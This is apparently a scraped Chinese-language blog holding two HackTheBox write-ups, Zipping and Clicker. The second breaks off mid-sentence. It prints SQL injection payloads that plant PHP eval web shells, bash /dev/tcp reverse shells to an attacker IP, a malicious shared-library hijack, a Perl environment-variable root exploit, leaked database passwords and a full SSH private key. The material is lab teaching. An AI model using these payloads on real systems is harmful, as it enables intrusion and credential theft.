12345678910111213141516171819#/var/www/html/functions.php&lt;?phpfunction pdo_connect_mysql() { // Update the details below with your MySQL details $DATABASE_HOST = 'localhost'; $DATABASE_USER = 'root'; $DATABASE_PASS = 'MySQL_P@ssw0rd!'; $DATABASE_NAME = 'zipping'; try { return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS); } catch (PDOException $exception) { // If there is an error with the connection, stop the script and display the error. exit('Failed to connect to database!'); }}// Template header, feel free to customize thisfunction template_header($title) {$num_items_in_cart = isset($_SESSION['cart']) ? count($_SESSION['cart']) : 0;?&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041#/var/www/html/upload.php &lt;?php if(isset($_POST['submit'])) { // Get the uploaded zip file $zipFile = $_FILES['zipFile']['tmp_name']; if ($_FILES[&quot;zipFile&quot;][&quot;size&quot;] &gt; 300000) { echo &quot;&lt;p&gt;File size must be less than 300,000 bytes.&lt;/p&gt;&quot;; } else { // Create an md5 hash of the zip file $fileHash = md5_file($zipFile); // Create a new directory for the extracted files $uploadDir = &quot;uploads/$fileHash/&quot;; $tmpDir = sys_get_temp_dir(); // Extract the files from the zip $zip = new ZipArchive; if ($zip-&gt;open($zipFile) === true) { if ($zip-&gt;count() &gt; 1) { echo '&lt;p&gt;Please include a single PDF file in the archive.&lt;p&gt;'; } else { // Get the name of the compressed file $fileName = $zip-&gt;getNameIndex(0); if (pathinfo($fileName, PATHINFO_EXTENSION) === &quot;pdf&quot;) { $uploadPath = $tmpDir.'/'.$uploadDir; echo exec('7z e '.$zipFile. ' -o' .$uploadPath. '&gt;/dev/null'); if (file_exists($uploadPath.$fileName)) { mkdir($uploadDir); rename($uploadPath.$fileName, $uploadDir.$fileName); } echo '&lt;p&gt;File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:&lt;/p&gt;&lt;a href=&quot;'.$uploadDir.$fileName.'&quot;&gt;'.$uploadDir.$fileName.'&lt;/a&gt;'.'&lt;/p&gt;'; } else { echo &quot;&lt;p&gt;The unzipped file must have a .pdf extension.&lt;/p&gt;&quot;; } } } else { echo &quot;Error uploading file.&quot;; } } } ?&gt; 代码审计+sql四个文件基本存在漏洞点的地方就是在cart.php的sql查询中 1234567if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]/i&quot;, $quantity, $match)) { echo ''; } else { // Construct the SQL statement with a vulnerable parameter $sql = &quot;SELECT * FROM products WHERE id = '&quot; . $_POST['product_id'] . &quot;'&quot;; // Execute the SQL statement without any sanitization or parameter binding $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC); 要想办法绕过&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;;这个正则匹配就是：如果你是以A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\&quot;,.&lt;&gt;\\/?这其中的字符开头或者以一个非数字结尾的话就会匹配成功 ^：匹配输入的开始位置。 .*：匹配任意字符（除换行符之外）零次或多次。 [A-Za-z!#$%^&amp;*()-_=+{}[]\\|;:’”,.&lt;&gt;/?]：匹配任意一个字母或特殊字符。 |：表示或者的意思。 [^0-9]：匹配除数字之外的任意字符。 $：匹配输入的结束位置。 我们这里就是利用了.*不匹配\\n的特性来绕过正则匹配的 并且$pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);存在堆叠注入 webshell现在思路比较清楚了，利用sql注入 into outfile上传木马，再文件包含木马；为什么要包含？直接把🐎放在/var/www/html/下，在访问不就可以了吗？确实，想的很美好；但是在上马的过程中会发现/var/www/html/一直不成功，猜测是没有权限，只能将🐎放在其他有权限的地方，再包含利用。 1%0a'; select '&lt;?php phpinfo();eval($_REQUEST[1]);?&gt;' into outfile '/var/lib/mysql/shell.php'; --1 123456789101112131415POST /shop/index.php?page=cart HTTP/1.1Host: 10.10.11.229User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencodedContent-Length: 163Origin: http://10.10.11.229Connection: closeReferer: http://10.10.11.229/shop/index.php?page=product&amp;id=1Cookie: PHPSESSID=7c043nqbhm56rmfbgitd4vestcUpgrade-Insecure-Requests: 1quantity=1&amp;product_id=%0a'%3B%20select%20'%3C%3Fphp%20phpinfo()%3Beval(%24_REQUEST%5B1%5D)%3B%3F%3E'%20into%20outfile%20'%2Fvar%2Flib%2Fmysql%2Fshell.php'%3B%20--1 再反弹webshell,成功拿到rektsu用户 1234&quot;/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.13/5555 0&gt;&amp;1'&quot;%22%2Fbin%2Fbash%20-c%20'%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F5555%200%3E%261'%22POST:1=system(%22%2Fbin%2Fbash%20-c%20'%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F5555%200%3E%261'%22); 成功拿到shell，我们再回去看一下之前没有上传成功是不是没有权限导致的； 12345678rektsu@zipping:/var/www$ ls -l /var/wwwdrwxr-xr-x 5 root rektsu 4096 Sep 5 14:25 htmlrektsu@zipping:/var/www$ ls /var/www/html -ldrwxrwxr-x 3 root rektsu 4096 Dec 13 02:46 shoprektsu@zipping:/var/www$ ls -l /var/libdrwxr-xr-x 6 mysql mysql 4096 Dec 13 02:51 mysql 这里有就有点懵逼了，为什么/var/www/html/shop有权限却没有上传成功;/var/lib/mysql没有权限却成功了，奇怪； 后来又想了一下是sql对写入文件的目录有限制 在MySQL中，secure_file_priv变量用于限制INTO OUTFILE语句写入文件的目录。如果该变量没有设置或者设置为空，那么MySQL服务器将使用默认的数据目录来保存文件。 登陆数据库看一下；果然和我猜想的一样；为空，使用默认的数据目录来保存文件 12345678mysql -h localhost -u root -pMySQL_P@ssw0rd!SHOW VARIABLES LIKE 'secure_file_priv';+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_file_priv | |+------------------+-------+ 提权sudo -l发现可以运行一个二进制文件/usr/bin/stock； 12345678rektsu@zipping:/var/www$ sudo -lsudo -lMatching Defaults entries for rektsu on zipping: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser rektsu may run the following commands on zipping: (ALL) NOPASSWD: /usr/bin/stock 将/usr/bin/stock文件下载到本地gdb调试； 这里要我们输入密码，我们不知道，先输入垃圾字符 这个存在一个checkAuth,应该是验证密码的函数，按s跟进看一下这个函数在干嘛 可以看到将我们输入的字符与St0ckM4nager作比较；说明St0ckM4nager就是password 第二次调试：输入正确的密码，看看下面会执行什么 这里调用了dlopen函数并且文件名是/home/rektsu/.config/libcounter.so 在C语言中，dlopen函数用于动态加载共享库（也称为动态链接库）并返回一个句柄，以便在运行时使用库中的函数和符号。 一下就想到LD-PRELOAD劫持so文件到达提权的目的。ls -l /home/rektsu/.config/libcounter.so 并没有这个文件。需要我们再本地制作恶意的动态链接库； 1234#include &lt;stdlib.h&gt;void _init() { system(&quot;/bin/bash&quot;);} 生成恶意动态链接库：gcc hack.c -fPIC -shared -o libcounter.so -nostartfiles 123456wget 10.10.16.13:8000/libcounter.sosudo /usr/bin/stockSt0ckM4nageriduid=0(root) gid=0(root) groups=0(root) 总结nmap搜集到80端口开放；dirsearch搜集/upload.php,/shop;其中/shop/index?page=存在包含任意php文件漏洞；/upload.php存在任意文件读取，读取到/var/www/html/shop/cart.php发现存在sql注入；可以利用into outfile注入🐎；再利用文件包含🐎；反弹shell得到rektsu用户；sudo -l发现sudo运行/usr/bin/stock文件，下载到本地调试，发现stock加载了动态链接库/home/rektsu/.config/libcounter.so;劫持动态链接库来提权。","link":"/2023/12/13/Zipping(HTB)/"},{"title":"Clicker(HTB)","text":"信息搜集nmap12345678910sudo nmap -p- -sT -min-rate 4000 10.10.11.232PORT STATE SERVICE22/tcp open ssh80/tcp open http111/tcp open rpcbind2049/tcp open nfs8000/tcp open http-alt36831/tcp open unknown41197/tcp open unknown59535/tcp open unknown NSF泄露备份文件2049/tcp open nfs NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享,以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。 123456789101112┌──(kali㉿kali)-[~]└─$ showmount -e 10.10.11.232 Export list for 10.10.11.232:/mnt/backups *#/mnt/backups目录被以只读方式（*）共享出来，这意味着其他主机可以通过NFS协议挂载这个目录，并且只能以只读方式访问其中的文件。sudo mount -t nfs 10.10.11.232:/mnt/backups /tmp/clickersudo cp ./clicker.htb_backup.zip /home/kaliunzip clicker.htb_backup.zip 1234567891011121314151617总计 64-rw-rw-r-- 1 kali kali 3934 9月 2日 04:18 admin.phpdrwxr-xr-x 4 kali kali 4096 2023年 2月28日 assets-rw-rw-r-- 1 kali kali 608 9月 2日 04:17 authenticate.php-rw-rw-r-- 1 kali kali 541 9月 2日 04:17 create_player.php-rw-rw-r-- 1 kali kali 2536 9月 2日 04:18 db_utils.php-rw-r--r-- 1 kali kali 1376 9月 2日 04:18 diagnostic.php-rw-rw-r-- 1 kali kali 1977 9月 2日 04:18 export.phpdrwxr-xr-x 2 kali kali 4096 9月 2日 04:18 exports-rw-rw-r-- 1 kali kali 3887 9月 2日 04:18 index.php-rw-rw-r-- 1 kali kali 3423 9月 2日 04:18 info.php-rw-rw-r-- 1 kali kali 3301 9月 2日 04:18 login.php-rw-rw-r-- 1 kali kali 74 9月 2日 04:17 logout.php-rw-rw-r-- 1 kali kali 3341 9月 2日 04:17 play.php-rw-rw-r-- 1 kali kali 3070 9月 2日 04:17 profile.php-rw-rw-r-- 1 kali kali 3333 9月 2日 04:18 register.php-rw-rw-r-- 1 kali kali 563 9月 2日 04:18 save_game.php 贴几个需要利用的文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#db_utils.php&lt;?phpsession_start();$db_server=&quot;localhost&quot;;$db_username=&quot;clicker_db_user&quot;;$db_password=&quot;clicker_db_password&quot;;$db_name=&quot;clicker&quot;;$mysqli = new mysqli($db_server, $db_username, $db_password, $db_name);$pdo = new PDO(&quot;mysql:dbname=$db_name;host=$db_server&quot;, $db_username, $db_password);function check_exists($player) { global $pdo; $params = [&quot;player&quot; =&gt; $player]; $stmt = $pdo-&gt;prepare(&quot;SELECT count(*) FROM players WHERE username = :player&quot;); $stmt-&gt;execute($params); $result = $stmt-&gt;fetchColumn(); if ($result &gt; 0) { return true; } return false;}function create_new_player($player, $password) { global $pdo; $params = [&quot;player&quot;=&gt;$player, &quot;password&quot;=&gt;hash(&quot;sha256&quot;, $password)]; $stmt = $pdo-&gt;prepare(&quot;INSERT INTO players(username, n, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)&quot;); $stmt-&gt;execute($params);}function check_auth($player, $password) { global $pdo; $params = [&quot;player&quot; =&gt; $player]; $stmt = $pdo-&gt;prepare(&quot;SELECT password FROM players WHERE username = :player&quot;); $stmt-&gt;execute($params); if ($stmt-&gt;rowCount() &gt; 0) { $row = $stmt-&gt;fetch(PDO::FETCH_ASSOC); if(strcmp($row['password'], hash(&quot;=&quot;,$password)) == 0){ return true; } } return false;}function load_profile($player) { global $pdo; $params = [&quot;player&quot;=&gt;$player]; $stmt = $pdo-&gt;prepare(&quot;SELECT nickname, role, clicks, level FROM players WHERE username = :player&quot;); $stmt-&gt;execute($params); if ($stmt-&gt;rowCount() &gt; 0) { $row = $stmt-&gt;fetch(PDO::FETCH_ASSOC); return $row; } return array();}function save_profile($player, $args) { global $pdo; $params = [&quot;player&quot;=&gt;$player]; $setStr = &quot;&quot;; foreach ($args as $key =&gt; $value) { $setStr .= $key . &quot;=&quot; . $pdo-&gt;quote($value) . &quot;,&quot;; } $setStr = rtrim($setStr, &quot;,&quot;); $stmt = $pdo-&gt;prepare(&quot;UPDATE players SET $setStr WHERE username = :player&quot;); $stmt -&gt; execute($params);}// ONLY FOR THE ADMINfunction get_top_players($number) { global $pdo; $stmt = $pdo-&gt;query(&quot;SELECT nickname,clicks,level FROM players WHERE clicks &gt;= &quot; . $number); $result = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC); return $result;}function get_current_player($player) { global $pdo; $stmt = $pdo-&gt;prepare(&quot;SELECT nickname, clicks, level FROM players WHERE username = :player&quot;); $stmt-&gt;bindParam(':player', $player, PDO::PARAM_STR); $stmt-&gt;execute(); if ($stmt-&gt;rowCount() &gt; 0) { $result = $stmt-&gt;fetch(PDO::FETCH_ASSOC); return $result; } else { return null; }}?&gt; 1234567891011121314151617181920212223#save_game.php&lt;?phpsession_start();include_once(&quot;db_utils.php&quot;);if (isset($_SESSION['PLAYER']) &amp;&amp; $_SESSION['PLAYER'] != &quot;&quot;) { $args = []; foreach($_GET as $key=&gt;$value) { if (strtolower($key) === 'role') { // prevent malicious users to modify role header('Location: /index.php?err=Malicious activity detected!'); die; } $args[$key] = $value; } save_profile($_SESSION['PLAYER'], $_GET); // update session info $_SESSION['CLICKS'] = $_GET['clicks']; $_SESSION['LEVEL'] = $_GET['level']; header('Location: /index.php?msg=Game has been saved!'); }?&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#export.php&lt;?phpsession_start();include_once(&quot;db_utils.php&quot;);if ($_SESSION[&quot;ROLE&quot;] != &quot;Admin&quot;) { header('Location: /index.php'); die;}function random_string($length) { $key = ''; $keys = array_merge(range(0, 9), range('a', 'z')); for ($i = 0; $i &lt; $length; $i++) { $key .= $keys[array_rand($keys)]; } return $key;}$threshold = 1000000;if (isset($_POST[&quot;threshold&quot;]) &amp;&amp; is_numeric($_POST[&quot;threshold&quot;])) { $threshold = $_POST[&quot;threshold&quot;];}$data = get_top_players($threshold);$currentplayer = get_current_player($_SESSION[&quot;PLAYER&quot;]);$s = &quot;&quot;;if ($_POST[&quot;extension&quot;] == &quot;txt&quot;) { $s .= &quot;Nickname: &quot;. $currentplayer[&quot;nickname&quot;] . &quot; Clicks: &quot; . $currentplayer[&quot;clicks&quot;] . &quot; Level: &quot; . $currentplayer[&quot;level&quot;] . &quot;\\n&quot;; foreach ($data as $player) { $s .= &quot;Nickname: &quot;. $player[&quot;nickname&quot;] . &quot; Clicks: &quot; . $player[&quot;clicks&quot;] . &quot; Level: &quot; . $player[&quot;level&quot;] . &quot;\\n&quot;; }} elseif ($_POST[&quot;extension&quot;] == &quot;json&quot;) { $s .= json_encode($currentplayer); $s .= json_encode($data);} else { $s .= '&lt;table&gt;'; $s .= '&lt;thead&gt;'; $s .= ' &lt;tr&gt;'; $s .= ' &lt;th scope=&quot;col&quot;&gt;Nickname&lt;/th&gt;'; $s .= ' &lt;th scope=&quot;col&quot;&gt;Clicks&lt;/th&gt;'; $s .= ' &lt;th scope=&quot;col&quot;&gt;Level&lt;/th&gt;'; $s .= ' &lt;/tr&gt;'; $s .= '&lt;/thead&gt;'; $s .= '&lt;tbody&gt;'; $s .= ' &lt;tr&gt;'; $s .= ' &lt;th scope=&quot;row&quot;&gt;' . $currentplayer[&quot;nickname&quot;] . '&lt;/th&gt;'; $s .= ' &lt;td&gt;' . $currentplayer[&quot;clicks&quot;] . '&lt;/td&gt;'; $s .= ' &lt;td&gt;' . $currentplayer[&quot;level&quot;] . '&lt;/td&gt;'; $s .= ' &lt;/tr&gt;'; foreach ($data as $player) { $s .= ' &lt;tr&gt;'; $s .= ' &lt;th scope=&quot;row&quot;&gt;' . $player[&quot;nickname&quot;] . '&lt;/th&gt;'; $s .= ' &lt;td&gt;' . $player[&quot;clicks&quot;] . '&lt;/td&gt;'; $s .= ' &lt;td&gt;' . $player[&quot;level&quot;] . '&lt;/td&gt;'; $s .= ' &lt;/tr&gt;'; } $s .= '&lt;/tbody&gt;'; $s .= '&lt;/table&gt;';} $filename = &quot;exports/top_players_&quot; . random_string(8) . &quot;.&quot; . $_POST[&quot;extension&quot;];file_put_contents($filename, $s);header('Location: /admin.php?msg=Data has been saved in ' . $filename);?&gt; 漏洞利用(update注入)升级roledb_utils.php文件中的save_profile函数存在sql注入：update; 利用链：play.php ==&gt; save_game.php ==&gt; db_utils.php ==&gt;save_profile 1234567891011function save_profile($player, $args) { global $pdo; $params = [&quot;player&quot;=&gt;$player]; $setStr = &quot;&quot;; foreach ($args as $key =&gt; $value) { $setStr .= $key . &quot;=&quot; . $pdo-&gt;quote($value) . &quot;,&quot;; } $setStr = rtrim($setStr, &quot;,&quot;); $stmt = $pdo-&gt;prepare(&quot;UPDATE players SET $setStr WHERE username = :player&quot;); $stmt -&gt; execute($params);} :player 占位符表示一个玩家的用户名，它将在执行查询时被 $params 数组中对应的值所替换。这种做法可以确保 SQL 查询的安全性;但是$setStr没有使用占用符号；存在注入点; 并且$args变量是通过save_game.php文件的foreach($_GET as $key=&gt;$value)函数，我们完全可以控制；即使在save_game.php文件对上传的GET参数的键值不能为role做了限制，也可以轻松绕过； 1234if (strtolower($key) === 'role') { header('Location: /index.php?err=Malicious activity detected!'); die; } 方法一将role%3d&quot;Admin&quot;%23当作键值绕过检查，再用#注释后面的内容 1UPDATE players SET role=&quot;Admin&quot;# WHERE username = :player 1GET /save_game.php?clicks=0&amp;level=0&amp;role%3d&quot;Admin&quot;%23 方法二利用/**/绕过strtolower($key) === 'role' 1UPDATE players SET role/**/=&quot;Admin&quot; WHERE username = :player 1GET /save_game.php?clicks=0&amp;level=0&amp;role%2f%2a%2a%2f=Admin 👆🐎export.php中存在危险函数file_put_contents($filename, $s);,先来看看$filename是怎么来的，如下： “exports/top_players_”加上8个随机字符，变量名为extension的post传参(这里没有对后缀做检查，可以修改后缀为php等)；所以文件后缀是我们可以控制的; 1$filename = &quot;exports/top_players_&quot; . random_string(8) . &quot;.&quot; . $_POST[&quot;extension&quot;]; 再来看看$s变量是怎么来的；当后缀不是txt,json时 其中$currentplayer[&quot;nickname&quot;],$currentplayer[&quot;clicks&quot;] ,$currentplayer[&quot;level&quot;];三个变量是我们可以控制的； 而$currentplayer[&quot;clicks&quot;] ,$currentplayer[&quot;level&quot;]的数据类型是数字，所以只能在nickname动手； &quot;nickname&quot;的值也可以通过update注入来改变； 1GET /save_game.php?clicks=1000001&amp;level=0&amp;nickname=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%73%68%65%6c%6c%27%5d%29%3b%3f%3e 在抓包将后缀改为php;extension=php 反弹shell 1POST:shell=system('%2Fbin%2Fbash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F5555%200%3E%261%22'); user_www-data思路应该先去数据库里找敏感信息，找不到再搜集别的敏感信息； 12bash-5.1$ find / -perm -4000 2&gt;/dev/null/opt/manage/execute_query 将jack用户的suid文件：/opt/manage/execute_query下载到本地查看 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657main(){if ( argc &gt; 1 ) { v8 = atoi(argv[1]); dest = (char *)calloc(0x14uLL, 1uLL); switch ( v8 ) { case 0: puts(&quot;ERROR: Invalid arguments&quot;); return 2; case 1: strncpy(dest, &quot;create.sql&quot;, 0x14uLL); goto LABEL_10; case 2: strncpy(dest, &quot;populate.sql&quot;, 0x14uLL); goto LABEL_10; case 3: strncpy(dest, &quot;reset_password.sql&quot;, 0x14uLL); goto LABEL_10; case 4: strncpy(dest, &quot;clean.sql&quot;, 0x14uLL); goto LABEL_10; default: strncpy(dest, argv[2], 0x14uLL);LABEL_10: strcpy(s, &quot;/home/jack/queries/&quot;); v4 = strlen(s); v5 = strlen(dest); name = (char *)calloc(v4 + v5 + 1, 1uLL); strcat(name, s); strcat(name, dest); setreuid(0x3E8u, 0x3E8u); if ( access(name, 4) ) { puts(&quot;File not readable or not found&quot;); } else { strcpy(src, &quot;/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v &lt; &quot;); v6 = strlen(src); v7 = strlen(dest); command = (char *)calloc(v6 + v7 + 1, 1uLL); strcat(command, src); strcat(command, name); system(command); } result = 0; break; } } else { puts(&quot;ERROR: not enough arguments&quot;); return 1; } return result;} 12/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v &lt; clean.sql#&lt; clean.sql 表示从名为 clean.sql 的文件中读取 SQL 命令，并将其发送到 MySQL 服务器以执行 这里有意思的是即使不是sql文件也可以读取； 123456789101112131415161718192021222324252627282930313233343536373839404142bash-5.1$ /opt/manage/execute_query 5 ../.ssh/id_rsamysql: [Warning] Using a password on the command line interface can be insecure.-------------------BEGIN OPENSSH PRIVATE KEY---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-----END OPENSSH PRIVATE KEY----------------- id_rsa 是 SSH 密钥文件的默认名称之一。在 SSH 密钥认证中，id_rsa 是私钥文件的默认名称，而 id_rsa.pub 是相应的公钥文件的默认名称。这些文件通常用于 SSH 客户端与服务器进行安全连接和身份验证。私钥文件（id_rsa）应该被妥善保管，而公钥文件（id_rsa.pub）通常被放置在需要进行身份验证的服务器上的 .ssh/authorized_keys 文件中。 SSH 密钥对通常用于替代传统的基于密码的身份验证，提供了更高的安全性。 这里读取的文件格式有点问题第一行和最后一行少了两个-符号，加上去，还需要将权限改成只读，否则不让连接： 12345678910┌──(kali㉿kali)-[~]└─$ ssh -i id_rsa -l jack 10.10.11.232@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0644 for 'id_rsa' are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key &quot;id_rsa&quot;: bad permissionsjack@10.10.11.232's password: 改成只读就好了，再用ssh连接即可； 1chmod 400 id_rsa user_jack提权12345678-bash-5.1$ sudo -lMatching Defaults entries for jack on clicker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser jack may run the following commands on clicker: (ALL : ALL) ALL (root) SETENV: NOPASSWD: /opt/monitor.sh 12345678910111213141516171819-bash-5.1$ cat /opt/monitor.sh#!/bin/bashif [ &quot;$EUID&quot; -ne 0 ]#id不为0 then echo &quot;Error, please run as root&quot; exitfiset PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binunset PERL5LIB;unset PERLLIB;data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);/usr/bin/xml_pp &lt;&lt;&lt; $data;if [[ $NOSAVE == &quot;true&quot; ]]; then exit;else timestamp=$(/usr/bin/date +%s) /usr/bin/echo $data &gt; /root/diagnostic_files/diagnostic_${timestamp}.xmlfi 其中； 12345678910unset PERL5LIB;unset PERLLIB;这两行命令是用于在Unix/Linux操作系统下取消设置环境变量的命令。让我为您解释每个命令的含义：unset PERL5LIB;：这个命令用于取消设置名为PERL5LIB的环境变量。PERL5LIB是一个用于指定Perl编程语言库路径的环境变量。通常情况下，它用于告诉Perl解释器在哪里查找Perl模块和库文件。通过运行这个命令，您将从环境中移除PERL5LIB变量的定义，使得Perl不再使用该变量来定位模块和库文件。unset PERLLIB;：这个命令用于取消设置名为PERLLIB的环境变量。类似于PERL5LIB，PERLLIB也是用于指定Perl库路径的环境变量。运行这个命令将从环境中移除PERLLIB变量的定义，停止使用它来定位Perl模块和库文件。取消设置这些环境变量通常是在需要恢复到默认Perl库路径或在特定情况下不希望使用这些自定义路径时使用的。它们在确保Perl在特定上下文中使用默认设置时非常有用。 应该时为了预防通过更改这两个环境变量来进行攻击，这说明了里面有perl写的程序。应该是/usr/bin/xml_pp，但是除了两个环境变量是危险的，还有两个。 **PERL5OPT=-d**：这部分将 PERL5OPT 环境变量设置为 d。在Perl中，d 选项用于启动调试器，它允许您在代码执行过程中进行调试。通常情况下，这是一个合法的用法，用于在开发和调试Perl脚本时启用调试功能。 **PERL5DB='system(&quot;chmod u+s /bin/bash&quot;);'**：这部分将 PERL5DB 环境变量设置为一个Perl表达式。这个Perl表达式看起来是一个恶意的命令，它试图在Perl调试器环境中运行 **system(&quot;chmod u+s /bin/bash&quot;);**。这个命令的目的是在系统中为 /bin/bash 这个Shell程序设置了用户可执行的SUID（Set User 